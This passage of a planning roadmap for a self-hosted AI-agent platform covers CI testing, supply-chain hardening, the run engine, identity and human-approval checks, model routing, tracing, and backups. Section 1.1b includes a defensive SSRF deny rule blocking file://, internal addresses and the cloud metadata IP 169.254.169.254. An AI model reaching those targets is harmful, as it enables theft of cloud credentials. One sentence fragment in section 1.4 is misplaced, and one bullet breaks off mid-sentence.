the app — and over Nginx because the Caddyfile is far less configuration to keep correct for the same
result. Use `tailscale cert` for TLS: the browser needs a secure context for WebCrypto, which plain
HTTP over a Tailnet IP does not provide.
**Decided:** Both. Caddy provides coarse, volumetric abuse protection (dropping traffic floods before they
reach Python). The FastAPI application handles semantic, per-identity business-logic limiting (e.g.,
Task budgets), because Caddy cannot read the database.

---

#### 0.4 — [COMPLETED] First real deployment to OCP SNO, with an Agent Substrate feasibility spike
**Goal:** The platform actually runs on the production target, and we know before Tier 2 whether
Agent Substrate (`google/agent-substrate`) can run there.
**Depends on:** 0.3, 0.5.
**Status:** COMPLETED. Spike outcomes recorded in [`hack/research/S6-agent-substrate-feasibility.md`](../../../hack/research/S6-agent-substrate-feasibility.md).
**Done when:** the chart deploys to OCP SNO;
Tailscale ingress reaches it; **and** a spike has answered: does the Agent Substrate control plane (`ateapi`/`atelet`) install on
SNO via `ko` or Helm, what SCC does it need, and can its `gVisor` (`runsc`) SandboxClass execute under OpenShift's constraints?
**Decided:** doing this at Tier 0 rather than Tier 2 — OpenShift SCC constraints are exactly the class of
problem that is cheap to discover now and expensive to discover after the execution layer is built.
**Decided (Spike S5: `hack/research/S5-rhacm-requirement.md`): RHACM is not a requirement.** Standalone SNO installs of OpenShift Sandboxed Containers are fully supported without Red Hat Advanced Cluster Management.

#### 0.6 — Correctness test strategy
**Goal:** The platform has a testing contract before agents start writing its code.
**Depends on:** 0.2.
**Done when:** the split is defined and enforced in CI — **unit** (pure logic, no cluster),
**integration** (against real Postgres and Temporal in kind), **end-to-end** (a task through a real
workspace); every entry's "Done when" maps to a test level rather than an assertion of doneness; a
known-failing test is either fixed or quarantined with an owning issue, never left red; **tests are
deterministic or they are quarantined** — a flaky suite is worse than a small one because it trains
everyone to ignore red.
**Decided: this is Tier 0 because of who will be writing the code.** The platform's own agents will
eventually modify this repo, and a test suite is the only thing that distinguishes a working change
from a confident one. Establishing it after the agents arrive is establishing it too late.
**Decided:** distinct from 5.5 (which evaluates *agent* quality) and 8.5 (which tests the *platform*
under failure). This is ordinary correctness testing, which neither covers.
**Known state:** `pytest -p no:randomly` passes 26; the default run intermittently fails
`test_update_config_valid_yaml` because `pytest-randomly` is active and module-level state
(`_allowlist_cache`) leaks between tests. Order-dependent flakiness, not a deterministic failure —
fix the isolation, not the assertion.
---

#### 0.7 — CI-local Tailscale Control Plane Mocking
**Goal:** CI can execute end-to-end integration tests on Caddy routing logic that relies on Tailscale cryptographic identity headers, without exposing production auth keys.
**Depends on:** 0.5, 0.6.
**Done when:** a local mock control plane is integrated into the CI environment, allowing the `tailscale-ingress` to authenticate ephemerally, and integration tests verify the `{http.auth.user.tailscale_user}` Caddy headers are correctly injected into upstream requests.
**Decided:** Deferred from the initial PR. Disabling `tailscale-ingress` entirely in CI is an acceptable stopgap for basic smoke tests. However, because the platform actively relies on Tailscale identity headers for downstream authorization, full end-to-end test coverage ultimately requires a mock control plane.
**Research Integration (`hack/research/deep-research-1727200000-tailscale-ci-testing.md`):** This establishes two founded pathways for implementation without production keys:
1. **System-Level CI (Headscale):** Deploying a lightweight Headscale container inside the CI Kind cluster. An ephemeral pre-auth key is generated (`headscale preauthkeys create`) and passed to the ingress deployment. This is the recommended path for our containerized infrastructure tests.
2. **Go-Native CI (`testcontrol`):** If the platform develops native Go integrations using `tsnet` (e.g., custom MCP servers), Tailscale's internal `tailscale.com/tstest/integration/testcontrol` provides a 100% auth-free, in-memory mock control plane by overriding `ControlURL`. This should be investigated for any future Go-based microservices.

#### 0.8 — Helm Chart API Contract (`values.schema.json`)
**Goal:** The Helm chart inputs are strictly validated against a schema before rendering, preventing silent type-coercion failures or invalid configurations.
**Depends on:** 0.2, 0.6.
**Done when:** `charts/agent-platform/values.schema.json` exists and is exhaustive; `helm lint` and the CI pipeline successfully validate inputs against it; the schema enforces correct types (e.g., strings for tags, booleans for toggles) and lists required properties.
**Decided:** Without a schema, users (or automated tools) can supply invalid types that silently bypass `helm lint` but break the Kubernetes API later. Establishing this contract in Tier 0 ensures agents and humans both have a deterministic validation boundary for infrastructure.

#### 0.9 — Automated Release & Promotion Pipeline
**Goal:** A manually triggered CI workflow that safely promotes `main`'s raw images into a versioned release, updating the Helm chart automatically.
**Depends on:** 0.2, 0.6.
**Done when:** A `workflow_dispatch` GitHub Action can pull the latest GHCR images, run the full Kind integration test suite against them, cut a GitHub Release, tag the container images with the semantic version, and open an automated PR updating the Helm chart's default `global.image.tag` to the new version.
**Decided:** PRs will *not* build the entire multi-container matrix locally to save CI resources. Routine PRs will test infrastructure changes against the latest stable `main` images. Full end-to-end validation and image tagging is reserved for this explicit release pipeline.

#### 0.10 - CI & Codebase Hardening
**Goal:** Mature the repository from multiple sources beyond just deterministic tool downloading, adopting comprehensive supply-chain security and strict validation patterns.
**Depends on:** 0.2.
**Done when:** The repository adopts a unified tool-fetching script (like `osac`); CI workflows operate with least-privilege `GITHUB_TOKEN` permissions (`permissions: read-all`); all third-party GitHub Actions are pinned to full SHAs (not mutable tags); CI caches binaries via composite keys; and strict security scanning (Trivy, Checkov, detect-secrets) is unified natively within our pipeline.
**Decided:** A piecemeal approach to CI security is insufficient. We are aligning our tooling, permissions, and CI pipelines with industry best practices (e.g., SLSA provenance recommendations and `osac`-style architecture) to protect against supply-chain injection and ensure deterministic validation.

#### 0.11 - Secrets Baseline Consolidation & Audit
**Goal:** Eliminate secret-sprawl by consolidating all necessary dummy/test credentials into a single source of truth (e.g., a centralized `values.yaml` or `.env.example`), and perform a comprehensive audit of `.secrets.baseline`.
**Depends on:** 0.10.
**Done when:** All scattered "dummy" values (in Makefiles, scripts, test files) are refactored to draw from a single configuration file; `.secrets.baseline` is regenerated and shrinks significantly; and every remaining entry in the baseline is explicitly audited and verified as a harmless mock value.
**Decided:** A sprawling `.secrets.baseline` file masks real credential leaks by overwhelming reviewers with scattered false positives. By consolidating dummy values into one isolated location, we drastically reduce the baseline's surface area, making strict audits trivial and safe.

## Tier 1 — Platform spine

End state of this tier: a deployed platform you log into that routes model traffic and shows you what
it costs. Useful standalone, even with no agents.

#### 1.1 — Core data model, migrations, and YAML export/import
**Goal:** Postgres becomes the canonical store, with a safe migration path and a full round-trip to YAML.
**Depends on:** 0.3.
**Done when:** schema covers projects, users, integrations, credentials, model catalog, agents, blocks,
workflows, runs, run events, and decisions/audit; Alembic migrations run at startup behind a Postgres
advisory lock with liveness probes disabled during migration; `export` produces YAML that `import`
restores byte-identically.
**Decided:** DB-canonical with YAML export. Shape the schema for multi-tenancy (owner/project scoping on
every row) without building the auth for it.

#### 1.1a — Durable run engine
**Goal:** Runs are durable, resumable, observable, and survive worker restarts.
**Depends on:** 1.1.
**Done when:** runs execute on Temporal with LangGraph via `temporalio.contrib.langgraph` (verified
present in temporalio 1.33.0) for predefined static agent sub-graphs, and a generic Temporal workflow interpreter for dynamic DB-defined block DAGs; non-deterministic nodes are activity-isolated (generic `execute_block` activity); large state is offloaded out of Temporal history; a run's state, node position, and event stream are queryable; killing a worker mid-run loses nothing.
**Decided (Research R5): Use Temporal's External Storage feature with Payload Codec encryption.**
Large LangGraph payloads (>2MB) easily breach Temporal's history limits. The `temporalio.contrib.langgraph`
plugin requires strict `execute_in: "activity"` separation for nondeterministic nodes. LangGraph state must
use `InMemorySaver`.
**Decided: state offload target is an S3-compatible object store (e.g., MinIO or local PVC shim).**
This same object store will physically back the Artifact Store (4.2). Postgres holds only the metadata pointers.
Payloads are encrypted *before* offload by Temporal's Payload Codec, ensuring encryption-at-rest.
**Decided (Spike pl-rsch-2): Real-time token streaming uses `temporalio.contrib.workflow_streams`.**
Temporal activities communicate over gRPC and execute to completion before returning results, but `temporalio 1.33.0`'s `temporalio.contrib.langgraph` natively integrates with `temporalio.contrib.workflow_streams`. When `streaming_topic="tokens"` is configured on `LangGraphPlugin`, activity-isolated LangGraph nodes publish token deltas via `WorkflowStreamClient.from_within_activity()`, batched into `__temporal_workflow_stream_publish` signals (default 100ms interval) to the workflow's `WorkflowStream`. The FastAPI gateway subscribes via `WorkflowStreamClient.create(client, workflow_id).subscribe(["tokens"])`, using long-poll `__temporal_workflow_stream_poll` workflow updates, and yields chunks as Vercel AI Data Stream Protocol typed parts (`0:"<text>"\n`). This bridges in-flight activity tokens to the frontend chat with ~100ms interactive latency, without external message brokers (Redis PubSub, NATS), without WebSockets, and without breaking activity determinism.
**Decided (Research): Workflow pauses require a TOCTOU Rebase-and-Resolve state machine.** Because upstream `main` branches drift during indefinite human approval waits (`workflow.wait_condition`), resuming a `Signal` triggers a background rebase. If a conflict occurs, the push is aborted, the conflict is routed to an LLM `ConflictResolver` block, and the newly generated code is **re-submitted to the pending queue for a fresh HITL approval** (enforcing I6).

#### 1.1b — Projects, repo bindings, and lifecycle
**Goal:** The entity everything else scopes to actually exists, and can be created, changed, and
retired.
**Depends on:** 1.1.
**Done when:** a **project** is a first-class record with a name, a state (active / archived), a
**Project Validation Pipeline** (an ordered list of code-quality/test commands to run post-generation, updated automatically when a background filesystem delta detects new config files like `Makefile` or `tox.ini`), and
**goals** — a short, human-authored statement of what the project is trying to achieve, because 5.3's
supervisor is specified to watch for drift *against project goals* and nothing currently stores them;
**repo bindings** exist as their own table (clone URL — strictly validated against SSRF/local file disclosure: only `https://` and `ssh://` schemes permitted, `file://` prohibited, and targets resolved to block RFC1918, loopback, and cloud metadata IPs like `169.254.169.254` —, default branch, role label, `workflow_mode` (`fork` or `direct`), an array of `shadow_policies` for convention enforcement on wild-west repos, and edges to sibling
bindings), many-to-many with projects per I9; creating, editing, archiving, and deleting a project are
all supported operations; **deletion reaps everything the project owns** — workspaces, PVCs, git
mirrors, project shadow repos (4.5b), warm pools, Secrets, memory rows, bindings — with a dry-run that reports what would go.
**Decided: split out of 1.1 because it was missing entirely.** 1.1's schema list named projects but
never repo bindings, while Part 2, 2.3 ("mirrors are per repo binding"), and 5.6 ("polled-repo count
tracks repo bindings") all consume them, and 8.2 requires "creates a first project with its repo" from
a surface that did not exist. A quality gate found the same declared-but-unbuilt pattern that had
already produced the Tailscale ingress gap.
**Decided: "project goals" is stored text, not an inferred concept.** 5.3 and 5.6 are unplannable
without it — a supervisor cannot flag drift from a goal nobody wrote down, and 5.6 turns that same
undefined predicate into an autonomous work-creation trigger.
**Decided: two distinct operations — archive, then delete — and delete requires a prior archive.**
- **Archive is reversible.** It stops triggers and supervisors and **releases the git mirrors and warm
  pools** (reclaimable disk; they rebuild from origin), while keeping definitions, memory, task
  records, and audit. Unarchiving re-clones and resumes. The only cost of archiving something by
  mistake is one re-clone.
- **Delete is only reachable from the archived state**, and **initiates a browser download of the
  project's full export before reaping anything**. The operator ends up holding the data on their own
  disk as a precondition of destroying it — so an irreversible action cannot complete without
  producing a copy first.
This is deliberately awkward in one direction: you cannot delete a live project in a single click, and
you cannot delete anything without taking the export. Given the reaper touches PVCs, mirrors, warm
pools, Secrets, and memory rows, that friction is the feature.
**Open:** what the export format is — presumably 1.1's YAML plus `result`-class artifacts (4.2) — and
whether a large export should stream rather than assemble in memory.

#### 1.1c — Cross-repo dependency graph
**Goal:** The graph I11 declares and 4.7 consumes is actually produced.
**Depends on:** 1.1b, 2.3.
**Done when:** edges between a project's repo bindings are **derived by parsing** — matching consumer
imports and package manifests against an in-project symbol table of exported packages — on a refresh
cadence, never hand-authored; the graph is queryable for dependency order; **staleness is visible**
(last-parsed timestamp, and a signal when a mirror has moved since); 4.7 orders its coordinated PRs from it.
**Decided: this closes I11**, which was the one invariant in Part 2A listed with no enforcing entry.
An invariant nothing implements is a declared-but-unbuilt component wearing a different hat, and this
document has been caught by that pattern twice.
**Decided: parsed, not authored** — Part 2's rationale stands. mabl built a hand-maintained version
across 100+ repos, cut context-drift failures from ~40% to <5%, and left "who maintains the graph"
unresolved in their own writeup. The named hazard is an agent "confidently shipping changes against a
stale model," which is why staleness is a first-class output here rather than an afterthought.
**Decided: two-sided manifest resolution with repo-binding package aliases.** Raw AST imports (e.g.,
`import osac_client`, `import "github.com/foo/bar"`) reference language-level package or module
identifiers, not platform repository bindings. A static parser cannot map an import to a sibling repo
without knowing which repo exports which package. 1.1c indexes producer manifests (`pyproject.toml`,
`go.mod`, `package.json`, `Cargo.toml`) across all bound repos to build an in-project package-to-repo
mapping. To handle polyglot naming gaps (e.g. Python distribution name `osac-client` vs module `osac_client`,
Go vanity import paths, or monorepos exporting multiple packages), repo bindings in 1.1b support an
optional `exported_packages` alias list. Consuming imports match against this table; unmapped imports
are treated as external third-party dependencies. CODEOWNERS attaches owner attribution to nodes, not
dependency edges.
**Open:** which languages to parse first. Start with whatever the operator's own projects use (Go and
Python, per `osac-project/osac`), and treat an unparsed ecosystem as *no edges* rather than guessing.

#### 1.2 — Identity and authorization
**Goal:** Tailscale-injected identity becomes a real user record with roles and project scoping.
**Depends on:** 1.1, 0.5.
**Done when:** `Tailscale-User-Login` resolves to a user row; roles are enforced by a single dependency
used by every protected route; project membership exists in the schema and is checked; the
file-based admin allowlist is retired; header spoofing from inside the cluster is blocked by NetworkPolicy;
browser-facing endpoints enforce CSRF protection via strict CORS allowlists, anti-CSRF request headers
(`X-Platform-CSRF`), and `Origin`/`Referer` verification to prevent cross-site request forgery via the ambient Tailscale connection.
**Decided: Cryptographic Chain of Custody for HITL.** Any Temporal `Signal` or `Update` used to resume a paused LangGraph node (e.g. from the UI or Slack) must carry a cryptographically signed identity assertion derived from the Tailscale JWT or Slack verification token. The LangGraph `Command(resume=...)` state machine validates this token to ensure unauthenticated internal scripts cannot bypass HITL approvals.
**Decided: every client surface maps to the same platform identity.** Tailscale identity is the root,
but 7.5 (CLI), 7.6 (ACP), and especially 7.7 (Slack) let a human approve permission decisions and
answer queue items — so each needs an explicit mapping to a platform user, and the **audit row records
which surface the decision came through**. An approval whose actor is "someone in Slack" is not an
audit trail. Unmapped identities cannot approve; they can observe.
**Decided: the platform's own API is rate-limited.** Per-identity limits on the unified API, the 2.2
exec/file plane, and the 7.6 socket. Every rate-limiting clause so far concerns *GitHub's* limits
applied to us; nothing bounded traffic *at* us, and an agent in a retry loop is a more likely source of
load than an attacker.
**Decided:** Yes, keep a break-glass local admin path for when Tailscale is down. It is off by default
and heavily audited when used.

#### 1.2b — [SPIKE] Lightweight OIDC Identity Provider Architecture (S7)
**Goal:** Determine the architectural source of truth for OIDC JSON Web Tokens (JWTs) required by internal control planes (Agent Substrate, Temporal) to establish zero-trust machine-to-machine identity.
**Depends on:** 1.2.
**Done when:** A feasibility spike (S7) is completed and documented in `hack/research/S7-oidc-architecture.md`, evaluating purpose-built lightweight OIDC servers (e.g., Dex, Authelia, ORY Hydra) against embedding a minimal OIDC issuer into the Python gateway (e.g., Authlib).
**Decided:** We will NOT unilaterally build a custom OIDC server into the gateway. We must evaluate existing, purpose-built OIDC solutions that fit the strict memory constraints of Single Node OpenShift (SNO) while avoiding the operational overhead of heavy brokers like Keycloak.
**Decided:** This architectural decision is required before Tier 2. Substrate unconditionally requires at least one valid JWT provider configuration to boot successfully; dummy endpoints break actor workflows.

#### 1.3 — Model catalog and pseudo-model routing
**Goal:** Blocks reference a logical model (`code-writer`, `validator`), and the platform resolves that
to a concrete provider with fallbacks.
**Depends on:** 1.1.
**Done when:** logical models are defined in the DB, rendered to LiteLLM config, hot-reloaded on change,
and a block referencing a logical name routes correctly and fails over down its chain; the
hand-maintained `litellm_config.yaml` duplication between `gateway/` and `charts/.../files/` is gone.
**Decided:** fallback logic lives in LiteLLM routing, not in block definitions.

#### 1.4 — Budget and external-quota-aware routing
**Goal:** Routing respects hard spend caps, including caps enforced outside the platform.
**Depends on:** 1.3.
**Done when:** a logical model can declare a budget (e.g. $300/month) and a source for *actual* usage —
either LiteLLM's own accounting or an **external quota API** for corporate models; the platform
reconciles external usage on a schedule; configurable thresholds (e.g. 80%, 95%) trigger routing
pressure — deprioritise, then divert to fallback, then hard-stop; threshold crossings surface in the
dashboard and the pending queue.
**Decided:** external reconciliation is authoritative over local estimates when both exist — local token
accounting will drift from a provider's billing.
**Verified LiteLLM behaviour this entry must build on:**
- **Transient limits are already handled correctly, if configured.** The router benches a deployment on
  cooldown rather than retrying every request, and it honours `Retry-After` via a priority chain
  (deployment config > `Retry-After` header > reset timestamp parsed from the error body > router
  default). So a provider saying "retry in 600s" sizes its own cooldown — it does **not** re-error on
  every request before falling back.
- **But the default `cooldown_time` is 5 seconds**, with `allowed_fails: 3`. A 10-minute consumer-quota
  window needs an explicit override, or reliance on the provider actually sending `Retry-After`. 429
  triggers cooldown immediately with no failure threshold. *(Validated via Spike S4: We must fail closed (fast) on quota exhaustion — LiteLLM hardcodes 403 to never trigger cooldown and retry-churns instead; no config fixes this).*
- **Retries exhaust on the failing deployment before any fallback fires** — `num_retries` retries the
  same model group first. Tune both together or the fallback is slower than it looks.
- **Cooldown state is per-process without Redis.** Multi-replica LiteLLM needs Redis or one replica

**Decided (Spike S4): Fail closed if the external quota API is unreachable.** LiteLLM handles 429s
(genuine quota limits from OpenAI/Anthropic) perfectly by triggering a cooldown, but it hardcodes a
403 to *never* cooldown, resulting in an infinite retry-churn until max retries. If our quota API
failed open and the provider subsequently threw a 403, it would thrash the deployment.
- **No external spend reconciliation exists.** `provider_budget_config` is purely LiteLLM's own
  accounting of traffic it observed. Any spend outside the proxy, or a provider billing cycle that
  differs from the configured window, silently diverges. **The reconciliation loop in this entry is
  therefore ours to build — it is not a config flag.**
- Pre-emptive `tpm`/`rpm` routing exists via `usage-based-routing-v2`, but LiteLLM's own docs
  discourage it in production due to per-request Redis latency. Prefer cooldown-on-429 plus our
  threshold logic over usage-based routing.
**Explicit deliverable, not just context:** this entry ships a reviewed LiteLLM routing configuration —
per-deployment `cooldown_time` sized to the real quota window (not the 5s default), `allowed_fails`
and `allowed_fails_policy` tuned per error class, `num_retries` set with the knowledge that it exhausts
before fallback, the three fallback lists populated distinctly, and **Redis provisioned if LiteLLM ever
runs more than one replica**. Config correctness is the feature here; the mechanism already exists.
rather than stable docs, including a cross-replica propagation lag of up to 10s.

#### 1.5 — Usage and cost ingestion with run attribution
**Goal:** Every dollar is attributable to a project, task, block, and run.
**Depends on:** 1.3.
**Done when:** LiteLLM spend/usage/latency/error/fallback data is ingested and joined to platform
entities via request metadata; per-project and per-run cost is queryable; data survives LiteLLM restarts.
**Decided:** metadata propagation (project/task/block/run IDs) must be designed here, because every later
observability entry depends on the same correlation IDs.
**Decided: non-LLM spend is in scope for this entry, not a separate concern.** Token cost is not the
only cost. Search-API queries bill per call (4.9b), browser automation holds 500MB–1GB per session,
the bulk-reader makes its own model calls (2.2), and sandbox CPU/storage is real. All of it attributes
to the same project/task/block/run keys. To prevent platform operations from starving task budgets, token limits are strictly split between **"Agent Task Tokens"** (billed to the task limit) and **"Platform Maintenance Tokens"** (e.g., background log reduction, review tasks, billed to global overhead), feeding 6.4's caps accordingly.

#### 1.5b — Trace backend and instrumentation
**Goal:** The thing 7.2 renders actually exists and is collecting.
**Depends on:** 1.5, 0.3.
**Done when:** OpenTelemetry (OTel) spans are routed directly into PostgreSQL; LiteLLM's callbacks are
wired to it so every model call produces a trace; spans carry the **same correlation IDs as 1.5**
(project, task, block, run) so a trace joins to a cost row and a run timeline rather than living in a
parallel universe; retention is configured rather than unbounded; the dashboard links a run to its
trace.
**Decided: split out because 7.2 consumed a backend nothing deployed.** "Trace backend" appeared exactly
once in this document — inside the entry that renders its data. Same declared-but-unbuilt pattern as
the Tailscale ingress and repo bindings; 7.2 was unshippable and nothing said so.
**Decided (Research R1): Langfuse is rejected due to footprint.** Self-hosting Langfuse requires a massive
6-service stack (Web, Worker, ClickHouse, MinIO, Redis, Postgres) demanding 8-12GB RAM, which is
unviable for SNO. We will route OTel spans directly to Postgres, utilizing LiteLLM's native OTel
integration to correlate cost rows via `litellm.call_id`.

#### 1.6 — Unified dashboard shell with model and cost views
**Goal:** A real single pane of glass exists, with its first genuinely useful content.
**Depends on:** 1.2, 1.4, 1.5.
**Done when:** authenticated nav shell with project switcher; model catalog view with budget status and
quota headroom; cost/usage views by project, model, and time; the current `page.tsx` prototype is
replaced.
**Decided:** this is the point at which the platform is independently useful — an LLM gateway with
budget-aware routing and a spend dashboard, before any agent exists.
**Decided: the chat wire format is the Vercel AI Data Stream Protocol.** It streams *typed parts* —
text deltas, tool calls, status, custom data — so the UI renders a running tool call differently from
prose, which is exactly what a supervisor dispatching background work needs. Adopting it means
`useChat` consumes the stream for free rather than inventing a protocol *and* a client. No
OpenAI-compatible endpoint was selected as a client surface, so there is nothing to keep compliant.
**Carry forward one hard-won warning** from the archived plan: never run synchronous work inside an
`async` handler — use `anyio.to_thread.run_sync`, or starve the event loop and stall every concurrent
stream.
**Decided:** the rebuild moves the frontend from npm to **pnpm 12.x** (current is v12.5.1, released
2026-09-18). pnpm has the safest defaults of the four without bolting anything on: lifecycle scripts
blocked since v10, release-age cooldown on by default since v11, and registry-qualified lockfile keys
so two registries serving the same name+version cannot collapse into one entry and silently substitute
a tarball — a structural protection the others lack. The strongest single feature is
**`trustPolicy: no-downgrade`** (pnpm 10.21): it hard-fails an install when a package's trust level
drops relative to its previous release — Trusted Publisher → Provenance → none. That is the only
mechanism found across all four managers that catches an axios-style compromised-republish
*automatically at install time*; npm's `npm audit signatures` does equivalent verification but is
manual/CI-only and never runs during a normal install. npm only reached parity in v12 (July 2026), which
**no Node LTS bundles**, so choosing npm means pinning `npm@12` as ongoing maintenance rather than
getting a safe default. Set `nodeLinker: hoisted` explicitly: pnpm's default symlinked layout has open
Next.js/Turbopack bugs (vercel/next.js#98791 dangling-symlink trace failures, #95450 standalone output).
Doing this inside the rebuild is near-free; as a standalone migration later it is not. The current
frontend is Next.js 14.2.3 and is being replaced here regardless.
**Decided: accessibility is a selection criterion for the component library, not a later pass.**
Keyboard navigation, focus management, and contrast are evaluated when the library is chosen and a
target is stated here. Nearly free at this moment; expensive to retrofit once every view is built
against a library that fights it — and it is the difference between a deliberate scope decision and a
silent omission.
**Decided (Research R4): React Aria Components (RAC).** R4 confirms RAC is the superior choice for an
accessible component library, specifically because it offers a native Data Grid primitive with built-in
state management for selection, sorting, and full keyboard navigation (unlike Radix UI, which requires
manual ARIA wiring via TanStack Table). Next.js standalone builds still struggle with symlinks,
confirming the decision to use `nodeLinker: hoisted` with pnpm.
**Verified (Research R4):** pnpm 12 maintains the strict lifecycle script blocking defaults.

#### 1.7 — Backup, restore, and disaster recovery
**Goal:** The canonical store can be lost and recovered, and that has been proven rather than assumed.
**Depends on:** 1.1.
**Done when:** scheduled Postgres backups run to storage **off the node**; a restore is executed end to
end and verified against a checksum of known rows, not merely "the job exited 0"; RPO and RTO are
written down; artifact and workspace storage have a stated policy (probably "disposable, not backed
up"); the restore runbook is a document someone could follow at 3am.
**Decided:** this sits in Tier 1, immediately after the canonical store exists, not near the end.
Production is **Single Node OpenShift** — there is no second node, no HA, and node loss is total loss.
The upgrade entry (8.3) treats `pg_dump` as a pre-migration gate, which is not a backup strategy; it
is one step of one procedure. Without this entry the platform has a single point of total data loss
from the moment 1.1 lands.
**Decided: `pg_dump -Fc` → `restic` → Cloudflare R2, mirrored to Backblaze B2.** No NAS dependency.
- **R2 because restore drills are free.** Egress is $0 unconditionally, so testing a restore costs
  nothing no matter how often. That directly defeats the failure mode where drill cost discourages
  drilling — the canonical bad case being Glacier Deep Archive, cheapest at rest but with retrieval
  fees *plus* egress on top, which is exactly how people end up never verifying a backup.
- **restic because it is one binary that does all three jobs** — AES-256 client-side encryption always
  on, deduplication, and retention (`forget --keep-daily/weekly/monthly --prune`) — with a restore path
  simple enough to execute under pressure. pgBackRest and WAL-G are better tools if we ever need
  WAL-level PITR, and are the right upgrade path, but they are more machinery than a
  tens-of-MB-to-few-GB database justifies now.
- **Cost:** $0/month at ~5GB (both providers have permanent 10GB free tiers), under $1/month at ~50GB
  across both. Second provider is for blast-radius separation, not capacity.
- **Rejected:** Wasabi (90-day minimum retention actively fights daily rotation — pruned objects still
  bill), Storj ($5/mo minimum fee), Hetzner Object Storage ($5.99/mo floor), iDrive e2 (reported 1TB
  minimum billing increment, unconfirmed), Glacier (see above).

**Backup credentials are the one case that cannot use the platform's own secret machinery.** The R2 and
B2 tokens and the restic passphrase are needed *before a cluster exists* during a rebuild, so storing
them only in Kubernetes Secrets makes them unrecoverable in exactly the scenario they exist for. They
live in the operator's out-of-band store — **1Password is the designated system of record**, named
explicitly so this is a documented location rather than a vague intention — with copies
mounted into the backup job's ServiceAccount for routine operation — **the mount is the cache, the
password manager is the source**. Bus-factor: the passphrase needs a documented second location, or the
backups are only as recoverable as one person's memory. Token scoping still applies (write-only for the
routine job, delete-capable only for pruning). Note the etcd caveat from 3.2 — until encryption at rest
is enabled, the in-cluster copies are base64 in etcd, which is a further reason the out-of-band copy is
authoritative rather than a duplicate.

**Two traps, both of which silently produce worthless backups:**
- **The restic passphrase must live outside the cluster.** A backup encrypted with a key that exists
  only inside the thing being backed up is not a backup. Password manager, recoverable by more than one
  person, never *only* a Kubernetes Secret.
- **If Velero is ever added for cluster-object state, override its repository password.** Velero's
  Kopia repo defaults to a hardcoded `static-passw0rd` unless explicitly set — "encrypted" backups
  using a publicly known key.

**Token scoping:** the routine backup job gets a write-only R2 token; pruning uses a separate token
with delete rights. A compromised backup job then cannot erase history.
**Done additionally when:** a **scheduled automated restore drill** exists — create a temporary scratch database (e.g. `CREATE DATABASE restore_drill_test`) within the existing PostgreSQL instance (rather than dynamically spawning separate Kubernetes Pods/PVCs which requires elevated RBAC), pull the latest snapshot, restore into the scratch database, run a sanity query — so "did the last backup actually restore" is never a manual chore that gets skipped. 8.3's pre-upgrade backup gate reuses this same pipeline.
**Memory is in scope, and it is the most irreplaceable thing here.** Since memory lives in Postgres
(5.1) rather than in user repos, this backup *is* the memory backup — no separate mechanism. Ranked by
what cannot be reconstructed: definitions and memory first (irreplaceable — a lost procedural memory is
a lesson re-learned the expensive way), then task and run history (reconstructible in principle,
painful in practice), then artifacts (disposable). Verify the restore drill covers the memory tables
specifically, not just that the dump restored.
**Accepted limitation: this restores from a dump, so it recovers loss, not corruption.** A logically
corrupt database backed up nightly is a corrupt database restored nightly. Point-in-time recovery needs
WAL archiving, which means pgBackRest or WAL-G — deliberately deferred above as more machinery than a
small database justifies today. State the consequence rather than discovering it: **the recovery window
for silent corruption is one backup interval**, and the trigger to revisit is the first time corruption
is suspected rather than a size threshold.
**Decided: back up everything except `evidence` artifacts.** In scope — definitions, repo bindings,
memory tiers, task records, the audit trail, **and full run history and traces**. Out of scope — the
`evidence` class from 4.2 (logs, diffs of already-published work, screenshots, bulk-read summaries),
which is reproducible or superseded and dominates volume without being irreplaceable.
**Run history is in scope because it is input data, not telemetry.** 5.5's evaluation harness replays
recorded tasks to decide whether a persona or model change helped; losing run history means losing the
baseline every future comparison is measured against. That is a capability loss, not an analytics one.
**Decided: retention is split from backup — keep run metadata long, evidence short.** Run records
(what ran, which blocks, outcomes, cost, duration) are small and are exactly what evals and trend
analysis consume, so they persist well beyond the bulky `evidence` artifacts hanging off them, which
age out on 4.10's schedule. Keeps the signal, drops the weight, and stops multi-MB screenshots dictating
how long a run stays replayable.
**Decided: Shadow Repos are included in the backup.** The directory of bare Git repositories (4.5b) is backed
up alongside the Postgres dump by the same `restic` process.
Decided: We ONLY consider the necessary state to recover the platform. A full cluster restore is unnecessary; a broken cluster will be installed fresh, then the platform installed fresh, followed by a platform restore functionality from the database backup.

#### 1.8 — Platform health, metrics, and alerting
**Goal:** The operator finds out the platform is broken without having to go looking.
**Depends on:** 1.1, 1.9.
**Done when:** every component exposes health and readiness; core metrics (queue depth, run failure
rate, worker liveness, DB connection saturation, disk headroom) are collected; logs are aggregated and
queryable across components; a small set of alerts reaches the operator out of band — the same channel
as the pending-user queue (6.1) rather than a separate paging system; a dashboard shows platform
health distinct from agent-run health.
**Decided:** this is deliberately separate from 7.1/7.2/7.3, which surface *what the agents did*. This
entry answers *is the platform itself alive* — an orchestrator wedged at 3am produces no runs to
observe, so run-centric views show nothing wrong. On a single node, disk headroom in particular is an
operational hazard: artifacts, run history, traces, container images, warm pools, and the git and
package mirrors all accumulate on the same disk.
**Decided (Research R1): Scope VictoriaMetrics to platform telemetry while retaining tuned OCP monitoring.** OpenShift's Cluster Monitoring Operator (CMO) is a mandatory core component managed by CVO and cannot be replaced without degrading cluster management. Instead, OCP Prometheus retention and resource requests are tuned down, while a lightweight VictoriaMetrics instance is deployed strictly for platform and application telemetry (LiteLLM, Temporal, sandboxes, custom agent metrics). Capacity is genuinely modeled now: Nexus CE is out (S2), Langfuse is
out (R1), clearing gigabytes of RAM for concurrent task workspaces.

#### 1.9 — Durable pause and resume primitive
**Goal:** Any run can stop, wait for an external decision, and continue — with nothing rendering it.
**Depends on:** 1.1, 4.1.
**Done when:** a run can pause with a typed request (a question, a permission decision, an approval)
recorded as a durable record; paused runs are discoverable by **Temporal Search Attribute**, never by
querying across all workflows, which is an O(N) anti-pattern; a resume API supplies the answer and the
run continues exactly where it stopped; resumption is idempotent under retry; a pause that is never
answered is visible as such rather than indistinguishable from a hung run.
**Decided: this is Tier 1 because five entries need it and none of them need a UI.** 1.4 surfaces
budget-threshold crossings, 1.8 raises health alerts, 4.6 escalates a give-up, 4.8 exhausts its rerun
bound, 5.3 flags project drift — all of them require *pause and resume*, and all of them predate the
inbox. Keeping the primitive and the interface in one Tier 6 entry created a real cycle (6.1 depended
on 4.6; 4.6's Done-when required 6.1) and four undeclared back-references.
**Decided:** also the substrate for **run cancellation** — the same mechanism that pauses a run
durably is what a stop request uses, so cancellation is not a separate system bolted on later.
**Decided (Cancellation semantics):** A cooperative `cancel` stops at a block boundary, retains the
workspace, and is **resumable** from the LangGraph checkpoint. A forceful `kill` terminates mid-block,
